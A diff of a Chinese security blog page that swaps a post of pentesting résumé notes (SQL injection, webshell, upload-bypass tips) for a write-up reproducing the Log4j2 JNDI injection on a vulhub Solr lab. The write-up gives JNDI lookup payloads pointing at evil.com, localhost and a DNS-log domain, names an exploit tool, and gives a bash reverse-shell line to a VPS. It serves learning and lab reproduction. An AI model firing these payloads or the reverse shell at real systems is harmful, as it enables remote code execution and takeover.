@@ -19,21 +19,26 @@
   <meta name="author" content="MaskObito">
   <meta name="keywords" content="">
   
-    <meta name="description" content="渗透测试  精通OWASP Top 10漏洞原理及利用技术，熟练运用MITRE ATT&amp;CK框架进行威胁建模，具备企业级网络安全架构渗透测试经验（涵盖Web应用、API、内网横向移动、移动应用等场景）。掌握渗透测试全流程（信息搜集、漏洞探测、漏洞利用、权限维持、痕迹清除），擅长制定针对性测试方案，曾主导多个小型企业网络安全评估项目，累计发现高危漏洞超15个。  Web安全工具：精通Bur">
+    <meta name="description" content="Log4j2的JNDI注入漏洞复现参考文章： https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;316143.html https:&#x2F;&#x2F;www.cnblogs.com&#x2F;0dot7&#x2F;p&#x2F;17259327.html 漏洞描述关于Log4j2Log4j2是一个Java日志组件，被各类Java框架广泛地使用。它的前身是Log4j，Log4j2重新构建和设计了框架，可以认为两者是完全独立的两个日志组">
 <meta property="og:type" content="article">
-<meta property="og:title" content="部分总结">
-<meta property="og:url" content="http://maskobito.github.io/2025/01/01/%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:title" content="Log4j2的JNDI注入漏洞复现">
+<meta property="og:url" content="http://maskobito.github.io/2025/01/15/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="MaskObito">
-<meta property="og:description" content="渗透测试  精通OWASP Top 10漏洞原理及利用技术，熟练运用MITRE ATT&amp;CK框架进行威胁建模，具备企业级网络安全架构渗透测试经验（涵盖Web应用、API、内网横向移动、移动应用等场景）。掌握渗透测试全流程（信息搜集、漏洞探测、漏洞利用、权限维持、痕迹清除），擅长制定针对性测试方案，曾主导多个小型企业网络安全评估项目，累计发现高危漏洞超15个。  Web安全工具：精通Bur">
+<meta property="og:description" content="Log4j2的JNDI注入漏洞复现参考文章： https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;316143.html https:&#x2F;&#x2F;www.cnblogs.com&#x2F;0dot7&#x2F;p&#x2F;17259327.html 漏洞描述关于Log4j2Log4j2是一个Java日志组件，被各类Java框架广泛地使用。它的前身是Log4j，Log4j2重新构建和设计了框架，可以认为两者是完全独立的两个日志组">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-12-31T23:52:03.000Z">
-<meta property="article:modified_time" content="2025-08-18T16:40:05.029Z">
+<meta property="og:image" content="http://maskobito.github.io/%5Cimages%5CLog4j2-1.png">
+<meta property="og:image" content="http://maskobito.github.io/%5Cimages%5CLog4j2-2.png">
+<meta property="og:image" content="http://maskobito.github.io/%5Cimages%5CLog4j2-3.png">
+<meta property="og:image" content="http://maskobito.github.io/%5Cimages%5CLog4j2-4.png">
+<meta property="article:published_time" content="2025-01-15T15:13:19.000Z">
+<meta property="article:modified_time" content="2025-08-18T16:42:54.230Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://maskobito.github.io/%5Cimages%5CLog4j2-1.png">
   
   
   
-  <title>部分总结 - MaskObito</title>
+  <title>Log4j2的JNDI注入漏洞复现 - MaskObito</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -203,7 +208,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="部分总结"></span>
+            <span id="subtitle" data-typed-text="Log4j2的JNDI注入漏洞复现"></span>
           
         </div>
 
@@ -214,8 +219,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-01-01 07:52" pubdate>
-          2025年1月1日 早上
+        <time datetime="2025-01-15 23:13" pubdate>
+          2025年1月15日 晚上
         </time>
       </span>
     
@@ -226,7 +231,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.3k 字
+          1.1k 字
         
       </span>
     
@@ -237,7 +242,7 @@
         
         
         
-          11 分钟
+          9 分钟
         
       </span>
     
@@ -274,48 +279,65 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">部分总结</h1>
+            <h1 id="seo-header">Log4j2的JNDI注入漏洞复现</h1>
             
             
               <div class="markdown-body">
                 
-                <ol>
-<li><p><em>渗透测试</em><br>  <em>精通OWASP Top 10漏洞原理及利用技术，熟练运用MITRE ATT&amp;CK框架进行威胁建模，具备企业级网络安全架构渗透测试经验（涵盖Web应用、API、内网横向移动、移动应用等场景）。</em><br><em>掌握渗透测试全流程（信息搜集、漏洞探测、漏洞利用、权限维持、痕迹清除），擅长制定针对性测试方案，曾主导多个小型企业网络安全评估项目，累计发现高危漏洞超15个。</em></p>
-</li>
-<li><p><em>Web安全工具：精通Burp Suite全模块操作（Intruder爆破、Repeater、Decoder），擅长自定义插件开发；熟练使用SQLmap、Dirsearch、Nmap、中国蚁剑等工具进行自动化漏洞检测，结合手工测试提升漏洞发现率。</em><br>  3.<em>编程语言：熟练运用Python&#x2F;C&#x2F;Java&#x2F;PHP开发安全脚本与工具（如漏洞扫描器、流量分析脚本），Python获蓝桥杯线下省二等奖，精通动态规划、树状数组、回溯、贪心、滑动窗口递归双指针等，精通将数据结构与算法优化应用于漏洞特征匹配（如二分查找+SQL布尔盲注、堆叠注入、时间盲注绕过waf）。</em></p>
-</li>
-<li><p><em>漏洞研究与代码审计</em><br>  <em>深入研究且精通SQL注入、文件包含、命令执行、反序列化等漏洞原理，具备PHP&#x2F;Java代码审计能力，熟悉网络协议分析（TCP&#x2F;IP、HTTP&#x2F;HTTPS），熟练使用并分析mysql数据库，擅长使用Fiddler、Wireshark、科来网络分析系统进行流量抓包与安全事件溯源。</em></p>
-</li>
+                <h1 id="Log4j2的JNDI注入漏洞复现"><a href="#Log4j2的JNDI注入漏洞复现" class="headerlink" title="Log4j2的JNDI注入漏洞复现"></a>Log4j2的JNDI注入漏洞复现</h1><p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/316143.html">https://www.freebuf.com/vuls/316143.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0dot7/p/17259327.html">https://www.cnblogs.com/0dot7/p/17259327.html</a></p>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><h3 id="关于Log4j2"><a href="#关于Log4j2" class="headerlink" title="关于Log4j2"></a>关于Log4j2</h3><p>Log4j2是一个Java日志组件，被各类Java框架广泛地使用。它的前身是Log4j，Log4j2重新构建和设计了框架，可以认为两者是完全独立的两个日志组件，但是因为存在前身Log4j，而且都是Apache下的项目，不管是jar包名称还是package名称，看起来都很相似</p>
+<h3 id="Log4j2-Lookup"><a href="#Log4j2-Lookup" class="headerlink" title="Log4j2 Lookup"></a>Log4j2 Lookup</h3><p>Log4j2的Lookup允许在日志配置和日志消息中动态插入变量值，这些变量可以是外部环境变量，也可以是MDC中的变量，还可以是日志上下文数据等。</p>
+<p>格式类似”${type:var}”，即可以实现对变量var的引用。type可以是如下值：</p>
+<ol>
+<li>ctx：允许程序将数据存储在 Log4j <code>ThreadContext</code>Map 中，然后在日志输出过程中，查找其中的值。</li>
+<li>env：允许系统在全局文件（如 &#x2F;etc&#x2F;profile）或应用程序的启动脚本中配置环境变量，然后在日志输出过程中，查找这些变量。例如：<code>$&#123;env:USER&#125;</code>。</li>
+<li>java：允许查找Java环境配置信息。例如：<code>$&#123;java:version&#125;</code>。</li>
+<li>jndi：允许通过 JNDI 检索变量。</li>
+<li>…</li>
 </ol>
-<p><em>项目一：中铁港航东南海洋工程有限公司全栈渗透测试项目 | 2025.02-2025.04</em><br><em>项目背景：在该企业实习期间，为集团旗下Web网址及内部网络进行全方位安全评估，防范数据泄露风险。</em><br><em>采用“黑盒+白盒”测试模式，使用Nmap扫描内网资产，结合BP爆破敏感接口，通过sql布尔盲注发现3处未授权访问漏洞，导致核心用户数据可被遍历。</em><br>*-通过PHP代码审计定位文件上传漏洞，利用蚁剑实现服务器权限获取getshell，进一步横向移动发现域控服务器弱口令，最终完成渗透测试</p>
-<p><em>项目成果：累计发现中危漏洞15个，协助企业建立漏洞管理体系，获该企业奖金5k</em></p>
-<p>http明文传输，https用ssl加密传输,ssl防窃听防中间人</p>
-<p>MITRE ATT&amp;CK是一个知识库，用来规划攻击的</p>
-<p>–tamper&#x3D;space2comment.py</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> payload:<br>    retVal = base64<span class="hljs-selector-class">.b64encode</span>(payload<span class="hljs-selector-attr">[::-1]</span><span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    retVal = base64<span class="hljs-selector-class">.b64encode</span>(retVal<span class="hljs-selector-attr">[::-1]</span>)<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;+++++++++++++&quot;</span>+retVal)<br></code></pre></td></tr></table></figure>
+<p>这次漏洞就跟jndi有关，我们接下来了解一下jndi注入的漏洞成因</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>JNDI（Java Naming and Directory  Interface，Java命名和目录接口），是Java提供的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象 。</p>
+<p>JNDI还支持从指定的远程服务器上下载class文件，加载到本地JVM中，并通过适当的方式创建对象。这里就是漏洞的主要来源</p>
+<p>由于Log4j 的 JNDI 支持并没有限制可以解析的名称。一些协议像rmi:和ldap:是不安全的或者可以允许远程代码执行。攻击者在可以控制日志内容的情况下，通过传入类似于<code>$&#123;jndi:ldap://evil.com/example&#125;</code>的lookup用于进行JNDI注入，执行任意代码。</p>
+<p><strong><code>rmi:</code> 协议</strong></p>
+<ul>
+<li><strong>RMI（Remote Method Invocation）</strong> 是 Java 提供的远程方法调用机制，允许一个 Java 虚拟机（JVM）调用另一个 JVM 上的对象方法。</li>
+<li>在 Log4j2 漏洞中，攻击者可以通过 <code>rmi:</code> 协议指向一个恶意的 RMI 服务器，从而触发远程代码执行。</li>
+</ul>
+<p><strong><code>ldap:</code> 协议</strong></p>
+<ul>
+<li><strong>LDAP（Lightweight Directory Access Protocol）</strong> 是一种用于访问目录服务的协议，常用于企业中的身份验证和资源管理。</li>
+<li>在 Log4j2 漏洞中，攻击者可以通过 <code>ldap:</code> 协议指向一个恶意的 LDAP 服务器，返回一个恶意类或序列化对象，从而触发远程代码执行。</li>
+</ul>
+<p>我们举个例子</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$&#123;</span><span class="hljs-symbol">jndi:</span><span class="hljs-symbol">ldap:</span>/<span class="hljs-regexp">/127.0.0.1/shell</span>&#125;<br></code></pre></td></tr></table></figure>
 
-<p>堆叠注入用；布尔盲注根据抓包回显判断，benchmark时间盲注</p>
-<p><strong>XSS、越权访问（水平&#x2F;垂直）命令执行、反序列化、文件上传&#x2F;包含&#x2F;路径遍历</strong></p>
-<p>跨站脚本攻击，将<code>&lt;script&gt;</code> 标签代码执行，反射型不会存储在服务器如钓鱼邮件，存储型长期在服务器上，窃取 Cookie，利用受害者身份进行攻击，如拒绝式服务攻击。</p>
-<p>system()    &#x2F;&#x2F; 执行外部程序并显示输出。过滤后可以用passthru。eval($c); 使用 eval() 函数执行 $c 变量中的代码。eval() 会将 $c 中的字符串作为 PHP 代码执行，这可能导致执行任意 PHP 代码，从而形成安全漏洞。调用shell.php，传入cmd，system ls，system cat tac</p>
-<p>本地文件包含漏洞（LFI   伪协议input； data：相对路径被过滤，服务器禁止访问根目录；<strong>include</strong>：当包含 .php 文件时会执行其中的代码，非显示源码z</p>
-<p>大小写绕过，过滤php可以用session，文件可控</p>
-<p>webshell：通过抓包改ua头上传恶意php，在用get或者post传参执行命令</p>
-<p>防御：不要直接包含用户输入，open_base限制PHP可访问的目录</p>
-<p>写脚本监控日志防止数据库泄露</p>
-<p>array检查是否是数组</p>
-<p><strong>编程语言</strong></p>
-<p>sql注入加上python二分查找大大减少爆破时间</p>
-<p><strong>mysql数据库</strong></p>
-<p>联合查询union select，增删查改</p>
-<p><strong>我熟练使用SQLmap进行自动化SQL注入检测和利用，用Dirsearch&#x2F;Nmap进行资产发现和目录扫描，用蚁剑管理Webshell</strong></p>
-<p><strong>漏洞研究</strong></p>
-<p>如文件上传欺骗改文件后缀php改成jpg绕过waf，执行恶意代码</p>
-<p><strong>我擅长使用Fiddler、Wireshark、科来网络分析系统进行流量抓包和分析</strong></p>
-<p><strong>‘黑盒测试+白盒审计</strong></p>
-<p>使用nmap扫描ip，开放端口，在线主机，dirsearch收集子域名，用sqlmap，bp对登录接口、用户查询接口、订单查询接口等<strong>敏感功能点</strong>进行手工测试</p>
-<p>**代码审计突破 (白盒)**发现文件上传漏洞，直接引用参数，应该先进行如base64，url编码，或添加死亡die函数，上传whoami等获得管理员信息，弱密码爆破</p>
-<p>、<strong>SQL注入</strong>和<strong>越权访问 是最常见的，通过PHP代码审计发现文件上传漏洞并最终拿到域控权限</strong></p>
+<p>当我们传入这个字符串的时候，log4j2组件就会将信息记录到日志中，并且log4j2会尝试解析这些信息，通过jndi的lookup()方法去解析该URL：ldap:&#x2F;&#x2F;127.0.0.1&#x2F;shell，由于是ldap协议，所以就会去该地址下的ldap服务中寻找名为shell的资源，找到后将资源信息返回给组件，之后log4j2组件就会下载下来，假如我们的shell文件的一个恶意的.class文件，那就会执行里面的代码，从而造成注入</p>
+<h2 id="环境搭建-漏洞复现"><a href="#环境搭建-漏洞复现" class="headerlink" title="环境搭建&amp;漏洞复现"></a>环境搭建&amp;漏洞复现</h2><p>vulhub靶场有现成的环境</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> vulhub/log4j/CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">44228</span>/<br><span class="hljs-attribute">docker</span>-compose up -d<br></code></pre></td></tr></table></figure>
+
+<p>使用vulhub靶场，启动一个Apache Solr 8.11.0，其依赖了Log4j 2.14.1</p>
+<p>起环境后访问8983端口</p>
+<p><img src="/%5Cimages%5CLog4j2-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后我们对网站进行测试，用一个dns服务器起一个域名，这里我用yakit的dns服务器</p>
+<p><img src="/%5Cimages%5CLog4j2-2.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span>&#123;jndi:ldap:<span class="hljs-comment">//wsythhvyqt.dgrh3.cn&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>利用JNDI发送DNS请求的Payload，并且在dns服务器上成功收到回显</p>
+<p>然后就是漏洞利用了</p>
+<p>使用JNDI注入工具</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">工具地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/welk1n/</span>JNDI-Injection-Exploit<br></code></pre></td></tr></table></figure>
+
+<p>然后我们构造反弹shell</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/vps.ip/port <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>然后用工具进行注入</p>
+<p><img src="/%5Cimages%5CLog4j2-3.png" srcset="/img/loading.gif" lazyload></p>
+<p>我这里版本是jdk1.8的，所以直接传就行，然后监听端口就可以收到了</p>
+<p><img src="/%5Cimages%5CLog4j2-4.png" srcset="/img/loading.gif" lazyload></p>
+<p>到此靶场的复现就完成了</p>
 
                 
               </div>
@@ -333,8 +355,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>部分总结</div>
-      <div>http://maskobito.github.io/2025/01/01/部分总结/</div>
+      <div>Log4j2的JNDI注入漏洞复现</div>
+      <div>http://maskobito.github.io/2025/01/15/Log4j2的JNDI注入漏洞复现/</div>
     </div>
     <div class="license-meta">
       
@@ -346,7 +368,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年1月1日</div>
+          <div>2025年1月15日</div>
         </div>
       
       
@@ -378,15 +400,21 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/01/02/%E6%B5%8B%E8%AF%95%EF%BC%88%E5%9B%BE%E7%89%87%EF%BC%89/" title="sql注入">
+                      <a href="/2025/01/16/OWASP%E6%BC%8F%E6%B4%9E/" title="OWASP漏洞">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">sql注入</span>
+                        <span class="hidden-mobile">OWASP漏洞</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2025/01/14/JAVA/" title="JAVA">
+                        <span class="hidden-mobile">JAVA</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
